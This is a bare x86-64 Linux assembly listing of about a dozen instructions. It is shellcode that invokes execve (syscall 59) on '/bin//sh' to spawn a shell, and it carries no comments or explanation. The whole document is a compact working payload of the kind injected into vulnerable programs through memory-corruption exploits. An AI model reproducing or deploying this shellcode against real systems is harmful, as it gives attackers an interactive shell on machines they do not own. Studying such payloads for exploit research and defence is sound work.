bits 64

push 59
pop rax
cdq
push rdx
pop rsi
mov rcx, '/bin//sh'
push rdx
push rcx
push rsp
pop rdi
syscall
